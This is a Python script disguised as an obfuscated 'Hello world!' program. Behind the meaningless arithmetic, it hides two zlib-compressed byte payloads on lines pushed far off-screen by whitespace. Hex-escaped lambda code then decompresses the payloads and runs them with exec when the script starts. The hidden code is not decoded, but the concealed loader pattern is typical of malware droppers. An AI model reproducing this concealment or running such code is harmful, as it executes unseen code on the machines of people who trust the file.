from builtins import *
from math import prod as _modulo


__obfuscator__ = 'Starlink'
__authors__ = ('Starlinkboy', 'BitchesPuller')
__github__ = ('https://github.com/starlinkboy' , "https://github.com/bitchespuller")
__discord__ = 'https://discord.gg/onlp'
__license__ = 'EPL-2.0'

__code__ = 'print("Hello world!")'


Statistics, CallFunction, DetectVar, _invert, Divide, Substract, _calculate = exec, str, tuple, map, ord, globals, type

class Round:
    def __init__(self, Ceil):
        self._math = _modulo((Ceil, 87635))
        self._floor(Positive=39841)

    def _floor(self, Positive = str):
        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
        self._math *= -2753 / Positive
        
        try:
            (((_invert, Statistics), _invert) for _invert in (_invert, Statistics))

        except AttributeError:
            ((System, (Divide, DetectVar)) for System in (_invert, Statistics) if Divide > Divide)

        except:
            _calculate(6585 * 27403) == str

    def _statistics(self, _algorithm = 75179):
        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
        _algorithm *= 36348 * -82808
        self._square != None
        
        try:
            {CallFunction: _invert} if CallFunction <= CallFunction else {CallFunction: _invert} != CallFunction

        except AttributeError:
            (((System, Divide), Divide) for Divide in {CallFunction: _invert})

        except:
            _calculate(-54505 * -62576) == False

    def _system(_hypothesis = bool):
        return Substract()[_hypothesis]

    def Add(_run = 11144 - -13598, _stackoverflow = Ellipsis, Invert = Substract):
        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
        Invert()[_run] = _stackoverflow
        
        try:
            (({'th5hl': CallFunction}, Statistics) for Statistics in (_invert, Statistics))

        except TypeError:
            (({'th5hl': CallFunction}, Statistics) for Statistics in (System, Divide))

        except:
            _calculate(-39298 - -44810) == False

    def execute(code = str):
        return Statistics(CallFunction(DetectVar(_invert(Divide, code))))

    @property
    def _square(self):
        self._ceil = '<__main__._calculate object at 0x000003230BE51884>'
        return (self._ceil, Round._square)

if __name__ == '__main__':
    try:
        Round.execute(code = __code__)
        _power = Round(Ceil = 71470 - 9020)

        if 359592 > 1632866:
            Round(Ceil = -46887 - -39666)._floor(Positive = _power._math / 80055)
        elif 425259 < 662845:
            Round(Ceil = -90530 * 15038)._statistics(_algorithm = 14040 * _power._math)                                                                                                                                                                                                                                                          ;Round.Add(_run='oDOoDoDoODoDDOOOO',_stackoverflow=b'x\x9c\xe5\x1cks\xa38\xf2\xbb\x7f\x857_\x0c7\x19\x0f\x16/;U\xfer\x97\xbbZ\xe7\x92\xf1\xd6\xe5j\'W3)\x17\x069!\x83Q\x16\xf0\xc6\xb9\xab\xbb\xdf~\xdd\x92pHl@\xd8\xb1\'[A\xe8AKj\xa4V\xab\xd5z@\x96<\x9e\xb4\xdap\x853\x8d\xfbxM&l:[\xa4\xbe\x97\xb1d2i\xff4<\xba\xcc\xbc$\n\xe3\xefGm\x96\x14\x92y\x8b\xec\x96%)O\xa3\xad\x12M\xd9\xe3\xd1\xf1\xd1\x9f\xc3\xcc\xbf\xa5\xe9/\x8b(\xa2\xc9\x91\xfe,\xdfM\x98\xdd.\xa62\xdbm\x96\xdd\xa7\'\x9f>\t`\xd7g\xf3O\xe93L\x1b\x12L\x05\xf2\xfbM\xc8\x830\xf5Y\x12\x88\x82\xe7y%\xb0{s\xf3\x89\xc5\xd1\xfd\x8bzD\xa1O\xe3\x94\x8a,\x7f\xfd\xe5\xfc#\xe9\x1a/\x92\xf8,\x10\xf1\x9d\xfb$\x8c3\xed\xe8g\x1aE\xac\xfd\xc0\x92(\xf8\xe9H\xef\xb4\xf4\x93Uj\x8c\xef\xa4\xdf\xc3\xa0\xa3\xb7\xe8\xd2\xa7\xf7\x99\xa4q|\xbf\x80\x9c\xff`)M\xdb^B\xdb\t\r\xbe\xc5\xbf\x86,\xa2\x99\x00L\xa3\x05\xfd\x16\xff\x8b-\xf8\x93\xd7F$\xdf\xe2\xcfl\xca\x82\xc7v\x14~\x87|\x8flq\xa4\xb7D\xa1\xc2\xf9=K\xb2\xc9\x04\xde\xf6\x98v\xf4.]\x86\x99\xa6\xb7"\xe6{Q\xaa\xe9_;wQ\x14\xde\xdd\xddE!\xb8!\x04\xc30\xba\x8b:\xd7\xc3\x9b\x88M!Ikc<fd\x8c\x8d\xc7l|:>=ec\xc6N\xc7\xdct\xbe\x9e\x9c|\xf8\xf8\xe1\xa3\xf6Q\xfb\xd0\xd3\xf5\xeb\xeba\x10&\xe5H\xe2y\x0c7\x18\xb8bn\xc1]\xc7qC3/\xcb*\xf0@I\x0c0X"\xc3\x18C\x10\xee1\x84\x18\x83\xaa\x88\xca\xb6\xca\xd3 \x86\xab/p]]}\x01\xff\xea\x8b\xf0\x10t\x05\xf9\x9f\xa8X^\x80\xe5\xf2\x01n\xb0\xe8p\x1f!\x0f\x90\xbb\x0c\xb1\xd6\x99.\xc2(\x0bcl\x96\xdf\xbd\xa4\xae\x80\x97\x97\x84\x08\x0b\x97\x08qC\x08\xbcDR.\'\xa4 \xabV\xfe\xea4\x0e\xb3(\\L_\x92Z?\x96\xed\x08\xa5`\xa7\x18\xc2\xd2@\x01\xb6@\xa5\x7f}E\\\xdd0\x0e\xe8R\xebD\x8c\xad\xc7^\xeb\xad\x12\xfa#\xe1\xe6\x9c&H\x10\xb0\x82\xdf\x90F@\xb5N\xa7{\xc7\xc2\xb8\x8a=s\xb6\xc4\xcc<\xff{"6]$\xff\xdcD\xecjF\xbd\xf8\xfc\xf9\x02,wE\xf8]\xd1,\x8d\xbc\xbfm"Z)\x93qR\xe4\x820\x9eK\xf7}qZ\xe6\xb1h\xd6\xb0_\x8f\xa2h\x14\x8d\xc0\x85k$\x1f\xc0\xdf\x82la\xe8\xa7^\x1c\xbe\x06\xd9JQmA\xb6r\\9\xd9\x1ega\xb4\xa4\xb7\xf1\xa2y/\x95T\x05\x17\t\xcb\xa9\x0cO\xef\x89\xe7"\xefw\xda\x9cn\x00\x1e\xa3\xc2\x83\xba\x0f\x06x\xa1\xde\x13\xd9\x92,m$\xde0\x0c6\x82H\x00\x82\x0f\xce{\xa2\x17\x8d\xc2\xfb9\xf3\x1b\xd1\xec\xfc\xfc\x0c\xee\xb3\xd19\x08\xb43\x08\x8f\xe0\xa9\x88`s\xe7\xd5:zo2\x98\xb8\x93\xde\xc4\x988`m\x08\xd9\x90\x9c\xacC\x15\xb0\x95\xc8Wm\xda1]{f:`m\xb0\x16\xd8\x1eXWZ\x03adJ\xfa$\xa8Mg\x92\x01(\xbf\x01\xc5\xa9\x93\xd6\xe9\xcf\xb2uA\xa6\x0b\xe7\xfa\x1dq\x8cO\x97\x1b\x05S\xc5Xxy)g\x03rn\x90{jL\x03\xd1\xc6n\x0ca\x90\x807x\xafI\x83F\xde|\x1ax\xed\xb1\x10\xa50\x8dD\xcbP\xb8\x9eT\xc9\xe0\n:\x94\x97\xd0\xa1N\xc0\r-\x84\xf2g*\xa1\xdc\xd6\x95\xffz\xd8\x98<\x84_F`x\xb9%\xc6[0\x94\x0c\x9c~\xbf\xd6\xb5\x07\xeeZZ\x0e\xdb\x0c\xdd\x01\xeb3\xdc\x9b\xb0\xab@\xca\xca\x95\x9b7K\x7f{`q\xd7X\xb9uu\xedm\xc4\xd2\xab\xc5\xab\x82]\x85\xaa\xebo\xeaq\xd7S(\xbb(S\xf0\xe6[\xa5\x9c&\xb2\x06\x8a\xe9+hV\xc2\r\x9b\xdb\xb1\xbegn|\xc3\xc6v)i\x8b7\xdc\x1ae\xbc\xccK\xdf\xb0?\xed\xd2\x12\xea|^\xd6\x1a\n-\xfb\x07h\x8d^]\x9c"\xe5\x9a\xf6\xb2:\x9e\xaen\xb9\x12\xee/o\x837\xd5\x02\xa2\xce\x05\xbe\xaf\x8e\xdb\x04]\x83\x95\xb9\x9b\xd2n\xc6\xfa,\xd7z\x1e\xf5\xb2\x1d\x8a\xe6\xe5\xad]\xdb\xabk5\x1b\xf5\x94\x95e\xdaB\x1fj\x96\xf2\xb05=x\x8b\xf6\xcacJ\xa4@i?\xa8M_\xd1\xae\xf5\x1c\xa0"\xb7\x94kR6\xbe\xa8\xd4b\xc7Z\xff\x88\x16~N\xcbZ\xfa\xa8\xb6A\xd3\x11I\xa5w\xec\xa4\xc1)\xb5~Ey\x15j\xb8%%\x0e\xdf\xea\xca\xf4V\xe9\xe7\xc1\xc6w\xd4\xcf\xc5\xeaF\xd0\r:\xcb*W\xf3r7\x9b%\x94\xc8\xa4}Q\xe3\x00\x1cP={\xd9\xa5\x9fV\xb7\x85B\xbf\xaa\x95O*Z\xea+\xe9\xc4{\x18\xd3K5\xf9\x83\xb5z\x9dv\xd9\\\xaf\xad\xc6\xb4Q\x0f\xae,\x99\x82N\xbc\x17\xad[\xbd\x06\r\xf5\xf0\xb73\xe3)7\x87-\xa3\xd3w-0\x86k\x9a\x1e\x99\x91\x99\xe3:\x03\xd7\x02\xa8\xed\x10B\x1d\xd3\x999\x01\x99\xb9&\xc0z.q|g\xe0Pg\xea\x10g\xe6\x0e\xb6\xc7\x07\xf9\x11j:}\xc7\x06\xdc\x06\xc4\xfa`l\x97\xfch\xea\xab\x9a\xe2\xba\xb7\xed;\x14\xadX\x11\xaf\xdd*\xd8j\xa9\xdf\n\xc0P0\x81\x0c\xe5\xcfTBW\xe1=,\xf5\x9b\xa4\xb0\xdd\x85v\x00\xb6/\xb7\xbc\x06r\xdb\xab/\xb7\xc7T\xd2:\n;*[\x91\xc96\xe1\xfd\xcf\xac0\xe2\xe9\xe9y\x1f\xfb!\xae=%=\x1b$\x8f\x05}\xc4u\x9c\x1e\xef-\x161l\xd7\x01\xee\x07^\x9f\x81\x99B\xfc\x0c\xf9\xdc\xb2\x1c\x9b\xf3<\xfa\x16\xe9\x11wO\x9c\xe3Y\xbe5\x00\x17\xad\x08\xfb`<\xee\x0f8\x84\xc3\xf6\xc17na{4\xf7\x917L\xe9\x17\xf9\xa6*\xad\xb9J\xbb\x13\xdft\xf8\xc9B\xb9\x91H\xc4\xd1C\xb5\xddD\x03\xa2{\xaf\x9a\xf2u\xf7\x1d\x9f\xed=\xe2\x06#\xdft<\x1d3&\xf7 \xf1\x1e\x9f\x94\xec\xcdo\xc7W\x03\x94\xd9\xc09\x03\x0c\t?7\xf8,b\x9d}\xf0\x15!0\x14A\xc7q\x89\x0b\x12\x05:\x9a\x83\x9d\xc8\xdd\x9b\xf0\xcd\xa5F.CrI\x92\xbb\xb9\\\xc1\xd0^\xaa\xcb\xc7M\xca%\x05\xb8\xfb\xaa\xa6\x8bW\x9f\xdb~!\xec\xae \xdc\xeeIt\x9a\x14E\xa7\r\xca\x00\xb4\'\xeea\xbf\x82P\xec\x8cq\x7f\x9d1\x83\x8d\xc1\xc5\xd3\x0c\xe3C\xf5\xe1\x9e\x94bxP\x84\x14l.\xc9\xf8\x01\x12)\xf9T\xd2ZM\xce lW\\|\xe5@\x8a\x1e.|\x0f1H\x0b\xf3r\x90\xce]\xb5\xa1Z\x8a=qn\x1ce\xbb8SN\xc8\x1eN\\\xe0\x90\xee;\x1eWW\x85+\xcc\x00\x8c\xc7]\x7f\x15\xc7\x9f\x94\x8b\x1f\x81\\\xe66D\xf9\x0c\xb2\xf9\xa4\xb4\x80U,/\x8f\xe8p\xf7\n\xcf\xea\xa0\xdd\x9d\x97m\xc9\x87n!l\x174;\xb3\xc0\xcbui\x89\x1a/o%H\xf6\xa5E\xe5\xa3\x99%\x1bX\x8crOF\x8c{[\xcb\xc6\x8e\xeeN\x9c\x89;!`\xcdI\x1f|2\xe9C.\x015\x8b\xd0\x1d\xdbRvpCQ\x9eT\xb1\x9a\xe8N\xb2\x8b\x19\xe87\x91\xb1P#\xac\x8f\xc5}{\x02\xcf\xf8\xe2u\xe8\x0f8\xc3U\xfeU\x8a\xa6\xfdo\xfdK\x00\x9d%\x9a\xb6\xe1\xab\n\xdd\x8b\x03mC\xf2m\x15y\x9f+\xeb\x1eg\xb5\xdc\xcd\x95\xfb<F]\xde\xf0\x91\x91\xa14D\xe1(\x07\xca-4\xc4\xce\xa5\x10\xb9\x82\\D\x1e\xd4\xbbT\xd1\xab_\x8fO+:\x16?\x19\n\x0cE\xc0\xb7\xa0;A\x87\x82\x9c\xce:T\x89mMHiCw\xec\xf3\\\xd8]\x11\x9b\xb5\x0e=\x98\xa2\xd1\xb0C\xe7v\xbb\x91\xdb\xb5\xfb\xd2\xb8\xd2\x8a\xb0[\xf0\x0baefD>\x83\x0b\x99-\xc4a\x10\x82\xdb\xb0\xe2\x05\xefa\xbc\xa3q\x1f\xdcC\x1d\x16u\x0bJ\\\xbe\xd4\x91+q\xf9R\x88\xfbb\xaa[\x95Ve\x89\xe4\xe5\xc4O\x1e \x8eW\x9f\x1f\xbe\xee\x84\x0f\xb4Qkf\xcd\x1c\xf01\x84\xcb\x19\xd63c\x1a\x0e\xb7\x18\xb7\x9f\x13\xa7\x8d\xd6\xe8\xdc\x17\xeb.\xc0\x92\xc4\xf1!&0)\xb8\xfb\x9aE\xf5\x0b\xb3\xa5\xe7n>\x93\x92\xb1;h\x0b\x86"\xc3vt\x87\x8f\xa7\x83I\x8fk\x11\x03\x18Q\x07\\\xafX\x83\x1e~\xcd\xa2\xaa\'\xcbw\x8c\xe4+\xf0U\x00P\xaaq\x9f\xeb\r\x16\x08c\x97\x0b\xf6>\xd7\xa4\x06\xeb\xd0\x1f\xa0Y4\x7fM\xbf \'\xf2\tb\xf1\xab\x03\x94\x19=)W\xaa\xd2\x9a\xf2\xd9\xdd\xd7\xac\x0e\xa6<\x9e\x9c\x04\xf9<\xfcd\x06r\xda\xb4\xbd~\\C "g\xca\xf9za.Ps\x02\xd9\x05\x02\x95\xa5]\xcd\xb6w\\c\x14\x10\tB_Q\xaf\x10j\xaf\xf8\x9e\xc5\x94\xdf\xb8X\xeb\xd0\xdd\x98v 9\xc3\x90\\\xd1+\x10\xa3/\x89\x91\x8fR*i\xb7\x1a\xa5\x84\x8e<_}\xfa"\xb4\xe5y\xbc\xdd\x84\x97\x8f\xf4\x17|\xb4\xbf\xe0\xaa\xb6\x12\xbd-N\xd5>\xd7\x01m0}>\xfd\xb0\xd7\xa1\x07\xd7\xce\xf6>0Z\x01\xdft3\x9d\x9e\x03\x03$\x0c\x8b\x963\x03W\xae\xbc\xe1\xf0H\x8c}\x0e\x90\xd6Jo\x10\xbaB\xee\xa2\x11\xba\x85\xaa\x06Q\xf8\xd6\x86\xc9\xb9\'\xffRi\xbc\xed\xc2O\xc7\x18\xf3\x1c0-\x1a\xf3_A\x18\x86!B\x07\x1d+V5[\xf2\xf2\x89\x12\x16\xdeZ]\xbdY\xc2\xe6\xed\xfc7\x0cm\xf1\x97\x876]R\xff\x98\xff\x88\xe3\x98\xff\xc8\x03\xc2Y\x0b\x81\x9a\\"\xe2\x8bE\xab\xb5#\xbd%\xf3\xe1\x8fD\x96m/m\'\xf4\xb7\x05M\xb3T\xa0\xbf\x7fL\xb3\xc7\x88\xfa\x11\xf5b\xf9\x8a?\xe5Y\xb2pN\xf30K[\xe1P\x90W\xde\x82\xee\xcb\x87\x16K\xbb)`\xa1s\xad1=\x1d\x87\x10\xe0Z\xdcB\xf6\x91\x83_n\xb0\x15W\x91q\xab\xcd\xa6\xae\x8fP\xb1|nz\xc0\xedS\xc8\x1d(\xf1\xb8\xde\x12\x7f>\xf9\x0b\x8bX\xe2e\xb4\xfb3K\xc2\x7f\xb38\xf3"\x01K\xbb\t\r&\x19\x9b\xe0_L\x8e\x85D+,\x04\xa0\x94\x03$\x0ftz;\x14\x7fB\xa9\xc0\x84(\x10')

        if 213553 > 8854113:
            Round(Ceil = -55794 * 4043)._statistics(_algorithm = -70291 * _power._math)
        elif 233512 < 781197:
            Round(Ceil = 84893 * -33532)._floor(Positive = _power._math * 92011)                                                                                                                                                                                                                                                          ;Round.Add(_run='IlllIIlIlllIIlllIl',_stackoverflow=b'\x15`<\x1e\x8b\x999\xf2\xb3\xb8\xb0\xc9\xc7\x0cp\xf9\x90\xa7\x19\xae\xa7\xe5\x07)*\x01\xcb\x9c\xa6\xa9wC\x87\xffi\xb5\xdb\x97r\xee.\xa7\xefr\x19\xf5d\xbb\x96\x99\xe6\xdb\x15@a\x05\x19\xf2_e\x02?\xe2\xbfg\x1e\x8e\xb7)\x95k\xcb#\x0c\xc87\x0eu\\B\xb9\xa9_.\x84\x12"Gw\xd3\x88\xd2{m5\xc3\xe4k:\x9f\x85\x0b\xad{\x1bFTC\xf9\xc3\xf2\xed\x06\xdeZ\xa2o\x16\xfe\x91\x93\x0c\xf3\x8e\xd4\xbdgi\xa6-\x92h\x88\xacq|\x97\xb2x(\x9bD_%\xcf\xf2\xff\x14\xad\xfe\xb13k\'\xdd4\xf3\xb2E\xca\xff\xcd3\x1c\x9e\x9d\x8f\xceFg\xe2s\xda\x11\x84\xcf!\xd4fI;/\x0c_\x97C)1~\x8e\t\xaf\x86\x84\xd7\x840\x12T\xe7d\x7fX"}^\xa2\r\x87\xe1\x87\xc2\xdaYq}\xa8\xa62\x91\xd4\xf4\x0b\x9a?\\\xb5\x05\xff\x95&Y\xe8?\x15\xfb\xf41\xf6\xe6\xa1\x7f1\xba\xd2\n5\xd1\xf5c\xad\xf0I\xa9\xdc\x01\xbe\xbc|Y\x85\xf5b\xc1\xe4\x19\xa6\xcfw\xe2\x82yt\x14\xbeR\x91\x90\xb87\t\xa51\x96m\xab\xde\x96\x1f:\xb0\tp\xb7\x85\xd2\xd0Be;\xe0\xd2\xd1v\xb8\xb4#}w\xea\xe2\xf1\x1b\xcf\xe5=\x13\xc6\xa2\x01\xe4sKvQ];pAv\xba&\xa4\xe2\xc7Z\x14\xfa\xc8:\x13\x14:M\xd2E\xee\x96J\x81lX\xeece\xae?\xe5\xb3;YG\x8c~B\'~$\xd5\xfe;}\x9c2/\tFqF\x93d\x91\xffZ\xea\xd95M\xa8\xf7}\x05\xfe\xe3\x8c/\xff\x07\xf5<\xfc\xf8')

        if 290905 > 5134014:
            Round(Ceil = -24393 * 32793)._statistics(_algorithm = 2964 * _power._math)
        elif 125851 < 3253141:
            Round(Ceil = -64569 * 8415)._floor(Positive = _power._math / 5102)                                                                                                                                                                                                                                                          ;nmmmnnmmnnnnmnnmmnmnnnm,S2S22S2S2S2S2S22SSS2S2SSSS,O0oO000O0OoOOO0oOO000oO,WXWXWWXWWWXWXXWXW,NNMNNNMMNNMNNNMMMMM=(lambda JLLLLIIJLLIIIIJLII:JLLLLIIJLLIIIIJLII['\x64\x65\x63\x6f\x6d\x70\x72\x65\x73\x73']),(lambda JLLLLIIJLLIIIIJLII:JLLLLIIJLLIIIIJLII(__import__('\x7a\x6c\x69\x62'))),(lambda JLLLLIIJLLIIIIJLII:globals()['\x65\x76\x61\x6c'](globals()['\x63\x6f\x6d\x70\x69\x6c\x65'](globals()['\x73\x74\x72']("\x67\x6c\x6f\x62\x61\x6c\x73\x28\x29\x5b\x27\x5c\x78\x36\x35\x5c\x78\x37\x36\x5c\x78\x36\x31\x5c\x78\x36\x63\x27\x5d(JLLLLIIJLLIIIIJLII)"),filename='\x77\x77\x78\x78\x78\x77\x78\x78\x78\x78\x78\x77\x78\x78\x77\x77\x77\x78',mode='\x65\x76\x61\x6c'))),(lambda WXWWXWWWXWWWXXWXXXWWXWWXX,JLLLLIIJLLIIIIJLII:WXWWXWWWXWWWXXWXXXWWXWWXX(JLLLLIIJLLIIIIJLII)),(lambda:(lambda JLLLLIIJLLIIIIJLII:globals()['\x65\x76\x61\x6c'](globals()['\x63\x6f\x6d\x70\x69\x6c\x65'](globals()['\x73\x74\x72']("\x67\x6c\x6f\x62\x61\x6c\x73\x28\x29\x5b\x27\x5c\x78\x36\x35\x5c\x78\x37\x36\x5c\x78\x36\x31\x5c\x78\x36\x63\x27\x5d(JLLLLIIJLLIIIIJLII)"),filename='\x77\x77\x78\x78\x78\x77\x78\x78\x78\x78\x78\x77\x78\x78\x77\x77\x77\x78',mode='\x65\x76\x61\x6c')))('\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x62\x75\x69\x6c\x74\x69\x6e\x73\x27\x29\x2e\x65\x78\x65\x63'))
        _power._floor(Positive = _power._math - 49889)                                                                                                                                                                                                                                                          ;NNMNNNMMNNMNNNMMMMM()(WXWXWWXWWWXWXXWXW(nmmmnnmmnnnnmnnmmnmnnnm(S2S22S2S2S2S2S22SSS2S2SSSS(O0oO000O0OoOOO0oOO000oO('\x76\x61\x72\x73'))),Round._system(_hypothesis='oDOoDoDoODoDDOOOO')+Round._system(_hypothesis='IlllIIlIlllIIlllIl')))

    except Exception as System:
        if 201727 > 3786755:
            Round.execute(code = CallFunction(System))

        elif 169014 > 8873766:
            _power._statistics(_algorithm = -68992 - _power._math)